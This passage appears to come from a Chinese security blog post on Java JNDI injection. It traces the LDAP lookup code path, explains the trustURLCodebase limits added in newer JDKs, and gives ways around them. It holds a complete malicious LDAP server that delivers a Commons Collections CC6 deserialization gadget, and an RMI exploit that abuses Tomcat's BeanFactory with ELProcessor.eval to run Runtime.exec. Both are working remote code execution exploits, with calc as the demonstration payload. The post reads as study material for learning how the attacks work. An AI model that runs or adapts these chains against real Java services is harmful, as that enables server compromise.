<h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><p>进入InitialContext.lookup方法：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720215950132.png" alt="image-20250720215950132"></p>
<p>先进入getURLOrDefaultInitCtx方法，主要通过协议名获取对应的对象进行lookup：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720220048125.png" alt="image-20250720220048125"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720220101133.png" alt="image-20250720220101133"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720220210430.png" alt="image-20250720220210430"></p>
<p>然后回到主逻辑ldapURLContext.lookup方法中，跟进到PartialCompositeContext.lookup方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720221534275.png" alt="image-20250720221534275"></p>
<p>跟进LdapCtx.p_lookup方法，由于headTail.getStatus()为2：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720222133804.png" alt="image-20250720222133804"></p>
<p>跟进c_lookup方法:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720222233494.png" alt="image-20250720222233494"></p>
<p>attributes存放着LDAP的基本信息，由于没java文件所以直接用网上的图:<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F27af794e-306c-4b71-9ef4-5568c47630e0%252FUntitled.png" alt="img"></p>
<p>跟进decodeObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720222450165.png" alt="image-20250720222450165"></p>
<p>JAVA_ATTRIBUTES是一个数组：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F8477c197-95cc-47fd-98e8-5e36cd0a462d%252FUntitled.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720222834709.png" alt="image-20250720222834709"></p>
<p><code>var0.get(JAVA_ATTRIBUTES[0]);</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F3e3db4e6-ba83-43d7-8f35-6358a0c12e5c%252FUntitled.png" alt="img"></p>
<p>JAVA_OBJECT_CLASSES也是一个数组，表示在LDAP的存储的形式:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./Java-JNDI%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F477f6bf6-2ae2-4b20-9566-148ff595f9d3%252FUntitled.png" alt="img"></p>
<p>最后会在decodeReference方法解码，传入javaReferenceAddress的相关信息:<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720223026630.png" alt="image-20250720223026630"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720223130574.png" alt="image-20250720223130574"></p>
<p>获取javaClassName、工厂名和加载工厂地址，封装成一个Reference对象，最后是返回这个对象的</p>
<p>回到c_lookup方法:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720223245541.png" alt="image-20250720223245541"></p>
<p>var3就是返回的Reference对象</p>
<p>跟进DirectoryManager.getObjectInstance方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250720223356883.png" alt="image-20250720223356883"></p>
<p>后面就和RMI是一样的了</p>
<h2 id="高版本限制绕过"><a href="#高版本限制绕过" class="headerlink" title="高版本限制绕过"></a>高版本限制绕过</h2><h3 id="JNDI-RMI-Reference限制"><a href="#JNDI-RMI-Reference限制" class="headerlink" title="JNDI_RMI_Reference限制"></a>JNDI_RMI_Reference限制</h3><p>在jdk 6u132，jdk 7u122，jdk 8u113之后Java限制了通过RMI远程加载Reference工厂类。com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类，在RegistryContext.decodeObject方法中多了一个对trustURLCodebase的判断，由于默认设置的原因，也就导致直接抛出了异常</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721101359277.png" alt="image-20250721101359277"></p>
<h3 id="JNDI-LDAP-Reference限制"><a href="#JNDI-LDAP-Reference限制" class="headerlink" title="JNDI_LDAP_Reference限制"></a>JNDI_LDAP_Reference限制</h3><p>在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的默认值同样被修改为了false，即默认不允许通过LDAP从远程的Codebase加载Reference工厂类</p>
<h3 id="LDAP本地Gadget绕过"><a href="#LDAP本地Gadget绕过" class="headerlink" title="LDAP本地Gadget绕过"></a>LDAP本地Gadget绕过</h3><p>LDAP服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象：</p>
<p>JNDI在完成lookup后会调用obj.decodeObject：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721150257467-17530813788865.png" alt="image-20250721150257467"></p>
<p>首先判断JAVA_ATTRIBUTES[SERIALIZED_DATA],也就是javaSerializedData是否为空</p>
<p>不为空就会调用deserializeObject方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721150333601.png" alt="image-20250721150333601"></p>
<p>这里的deserial就是从javaSerializedData获取的序列化数据</p>
<p>那么对象可以是我们传入恶意的序列化数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CC6的序列化对象数据)</span><br></pre></td></tr></table></figure>

<p>EvilServer：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:5432/#CC6&quot;</span>&#125;;  <span class="comment">//恶意对象下载地址</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;  <span class="comment">//LDAP服务端口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置LDAP服务器</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加恶意拦截器</span></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//启动服务</span></span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;    <span class="comment">//恶意代码地址</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);  <span class="comment">//发送恶意响应</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="comment">// 构造 class 文件实际路径 (将 #EvilObject 转换为 /EvilObject.class)</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;b1uel0n3&quot;</span>);  <span class="comment">//任意类名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建恶意 LDAP 条目</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  <span class="comment">//代码库地址 (http://127.0.0.1:5432/)</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  <span class="comment">//工厂类名（EvilObject）</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CC6());</span><br><span class="line">            result.sendSearchEntry(e);  <span class="comment">//发送给客户端</span></span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] CC6() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">            Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">            TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">            HashSet map=<span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">            map.add(tiedMapEntry);</span><br><span class="line">            innermap.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(map);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721151917060.png" alt="image-20250721151917060"></p>
<p>客户端发起请求能弹计算机</p>
<h3 id="加载本地工厂绕过"><a href="#加载本地工厂绕过" class="headerlink" title="加载本地工厂绕过"></a>加载本地工厂绕过</h3><p>环境：jdk 8u192</p>
<p>使用 jdk 高版本的时，即使在传入时候设置了 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 为 true，也会报错，调试时发现该值依然为 false</p>
<p>既然远程加载不行，那么我们是否可以通过本地加载<code>Reference Factory</code>呢？</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721143037710.png" alt="image-20250721143037710"></p>
<p>这里我们需要确定加载哪个工厂，工厂需要实现javax.naming.spi.ObjectFactory接口，还需要重写getObjectInstance方法，因为在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>最后的<code>return</code>语句对Factory类的实例对象进行了类型转换</p>
<h4 id="Tomcat8绕过"><a href="#Tomcat8绕过" class="headerlink" title="Tomcat8绕过"></a>Tomcat8绕过</h4><p>其中<code>org.apache.naming.factory.BeanFactory</code>恰好满足这些特点，且该类存在于Tomcat8依赖包中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//声明将 faster 属性映射到 eval() 方法</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//注入 EL 表达式</span></span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)&quot;</span>)); </span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>forceString用于声明属性与方法之间的强制映射关系，当设置 <code>faster</code> 属性时，实际调用 <code>eval()</code> 方法</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721105208427.png" alt="image-20250721105208427"></p>
<p>跟进源码分析：</p>
